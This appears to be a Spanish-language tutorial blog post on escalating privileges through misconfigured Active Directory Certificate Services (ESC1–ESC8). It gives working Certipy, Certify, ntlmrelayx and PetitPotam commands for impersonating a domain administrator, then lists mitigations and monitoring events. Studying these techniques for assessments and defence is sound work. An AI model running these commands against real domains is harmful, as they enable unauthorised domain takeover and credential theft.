---
layout: single
title: "ADCS: Abuso de Active Directory Certificate Services (ESC1-ESC8)"
date: 2026-08-13
categories: [writeups, tutoriales]
tags: [active-directory, adcs, certificates, privilege-escalation, windows, certipy, certify]
excerpt: "Active Directory Certificate Services convierte una CA mal configurada en un vector de escalada de privilegios directo hasta Domain Admin."
permalink: /tutoriales/adcs-esc1-esc8/
---

Active Directory Certificate Services (ADCS) lleva décadas en entornos Windows, pero fue en 2021 cuando Will Schroeder y Lee Christensen publicaron el paper *Certified Pre-Owned* detallando ocho clases de misconfiguraciones (ESC1-ESC8) que permiten escalada de privilegios hasta Domain Admin. Hoy en día sigue siendo uno de los vectores más frecuentes en assessments de AD.

## Por qué ADCS importa

Una CA de empresa (Enterprise CA) integrada en AD emite certificados que el sistema trata con confianza total. Un certificado de usuario o equipo válido puede usarse para autenticarse vía Kerberos (PKINIT) o NTLM sin necesidad de la contraseña. Si consigues que la CA emita un certificado que se haga pasar por DA, tienes DA.

El proceso normal es:

1. El usuario solicita un certificado usando una **plantilla** (Certificate Template).
2. La CA valida los permisos sobre la plantilla y emite el certificado.
3. El certificado se usa para autenticación.

Las misconfiguraciones aparecen en los pasos 1-2: plantillas que permiten a usuarios no privilegiados especificar el SAN (Subject Alternative Name), que tienen enrollment rights demasiado amplios, o que delegan enrollment sin validación adecuada.

## Enumeración

### Certify (Windows)

```powershell
# Enumerar CAs y plantillas vulnerables
.\Certify.exe find /vulnerable

# Enumerar plantillas específicas
.\Certify.exe find /ca:"DC01.corp.local\corp-DC01-CA"
```

### Certipy (Python/Linux)

```bash
# Enumeración completa desde Linux
certipy find -u jdoe@corp.local -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable

# Output a JSON para procesado posterior
certipy find -u jdoe@corp.local -p 'Password123!' -dc-ip 10.10.10.10 -json
```

Certipy marca automáticamente las plantillas con las etiquetas ESC1-ESC8.

## ESC1 — SAN arbitrario + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT

La plantilla tiene:
- `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activado: el solicitante puede especificar cualquier SAN.
- `ENROLLEE_SUPPLIES_SUBJECT` combinado con permisos de enrollment para usuarios de bajo privilegio.
- EKU que incluye Client Authentication (o Smart Card Logon, etc.).

```bash
# Solicitar certificado como Administrator
certipy req -u jdoe@corp.local -p 'Password123!' \
  -ca 'corp-DC01-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.10

# Autenticarse con el certificado obtenido
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

El resultado es un TGT y el hash NTLM del usuario suplantado.

## ESC2 — EKU Any Purpose o sin EKU

La plantilla define `Any Purpose` como EKU o no define ninguno. Esto permite usar el certificado para cualquier propósito, incluyendo autenticación de cliente.

El ataque es análogo a ESC1 si además el enrollee puede controlar el SAN. Si no, se puede encadenar con ESC3.

## ESC3 — Enrollment Agent + plantilla de delegación

Dos plantillas colaboran:
1. Una plantilla con EKU **Certificate Request Agent** permite obtener un certificado de agente de enrollment.
2. Otra plantilla permite que un agente solicite certificados **en nombre de** otros usuarios.

```bash
# Paso 1: obtener certificado de agente
certipy req -u jdoe@corp.local -p 'Password123!' \
  -ca 'corp-DC01-CA' -template 'EnrollmentAgentTemplate' \
  -dc-ip 10.10.10.10

# Paso 2: solicitar certificado como DA usando el agente
certipy req -u jdoe@corp.local -p 'Password123!' \
  -ca 'corp-DC01-CA' -template 'User' \
  -on-behalf-of 'corp\administrator' \
  -pfx jdoe.pfx \
  -dc-ip 10.10.10.10
```

## ESC4 — ACL débil sobre la plantilla

El usuario tiene `WriteOwner`, `WriteDacl` o `WriteProperty` sobre una plantilla de certificado. Esto permite modificar la plantilla para introducir la flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` y convertirla en ESC1.

```bash
# Certipy puede modificar la plantilla directamente
certipy template -u jdoe@corp.local -p 'Password123!' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.10

# Luego explotar como ESC1
certipy req -u jdoe@corp.local -p 'Password123!' \
  -ca 'corp-DC01-CA' -template 'TargetTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.10

# Restaurar la plantilla original
certipy template -u jdoe@corp.local -p 'Password123!' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json \
  -dc-ip 10.10.10.10
```

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 en la CA

La CA tiene activado el flag `EDITF_ATTRIBUTESUBJECTALTNAME2`, que permite especificar un SAN en *cualquier* solicitud, independientemente de la configuración de la plantilla. Una plantilla con Client Authentication EKU y enrollment rights para usuarios sin privilegios es suficiente.

```bash
certipy req -u jdoe@corp.local -p 'Password123!' \
  -ca 'corp-DC01-CA' -template 'User' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.10
```

## ESC7 — ACL débil sobre la CA

El usuario tiene `ManageCA` o `ManageCertificates` sobre la CA. Con `ManageCA` se puede activar el flag `EDITF_ATTRIBUTESUBJECTALTNAME2` para habilitar ESC6 inmediatamente.

```bash
# Activar EDITF_ATTRIBUTESUBJECTALTNAME2 en la CA
certipy ca -u jdoe@corp.local -p 'Password123!' \
  -ca 'corp-DC01-CA' \
  -enable-userspecifiedsan \
  -dc-ip 10.10.10.10
```

Con `ManageCertificates` se pueden aprobar solicitudes pendientes. El flujo es: solicitar un certificado ESC1, que quede en estado pendiente, y aprobarlo con los permisos de gestión.

## ESC8 — NTLM Relay a HTTP Enrollment Endpoint

La CA publica un endpoint de enrollment web en `http://CA-server/certsrv/` que no requiere firma (sin EPA/Extended Protection for Authentication). Se puede hacer relay de la autenticación NTLM de una cuenta privilegiada hacia ese endpoint para emitir un certificado en su nombre.

```bash
# Levantar el relay
ntlmrelayx.py -t http://CA-server/certsrv/certfnsh.asp \
  --adcs --template 'DomainController'

# Forzar autenticación del DC (coerce)
# Opciones: PetitPotam, PrinterBug, DFSCoerce
python3 PetitPotam.py -u jdoe -p 'Password123!' \
  attacker-ip DC-ip
```

El relay emite un certificado del DC, que luego se usa para DCSync o Pass-the-Ticket.

## Cadena completa: ESC1 hasta DA

```
Usuario sin privilegios
  → Enrollment sobre plantilla vulnerable (ESC1)
  → Certificado con UPN de Administrator
  → certipy auth → TGT de Administrator
  → secretsdump / DCSync
```

## Resumen de ESC1-ESC8

| ESC | Condición principal | Impacto |
|-----|---------------------|---------|
| ESC1 | SAN controlado por enrollee + Client Auth EKU | Suplantación de cualquier usuario |
| ESC2 | EKU Any Purpose o sin EKU | Autenticación arbitraria |
| ESC3 | Enrollment Agent + plantilla delegable | Solicitar certs en nombre de otros |
| ESC4 | ACL escribible sobre plantilla | Modificar plantilla → ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 en CA | SAN arbitrario en cualquier plantilla |
| ESC7 | ACL sobre la CA (ManageCA/ManageCerts) | Activar ESC6 o aprobar certs pendientes |
| ESC8 | NTLM relay al endpoint web de la CA | Cert del DC sin credenciales |

## Mitigaciones

- Auditar las plantillas con Certify o Certipy regularmente; buscar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` en plantillas con enrollment amplio.
- Deshabilitar `EDITF_ATTRIBUTESUBJECTALTNAME2` en todas las CAs si no es necesario.
- Revisar ACLs sobre plantillas y sobre la CA; `Authenticated Users` no debe tener `Enroll` en plantillas que permitan SAN arbitrario.
- Para ESC8: habilitar EPA en el endpoint de enrollment web (IIS) y migrar de HTTP a HTTPS con firma requerida.
- Monitorizar el Event ID 4886 (solicitud de certificado) y 4887 (certificado emitido) con alertas sobre UPNs de cuentas privilegiadas.

## Referencias

- Schroeder, W. & Christensen, L. — *Certified Pre-Owned* (2021), SpecterOps
- Certipy: `https://github.com/ly4k/Certipy`
- Certify: `https://github.com/GhostPack/Certify`
- Microsoft — MS-WCCE: Windows Client Certificate Enrollment Protocol
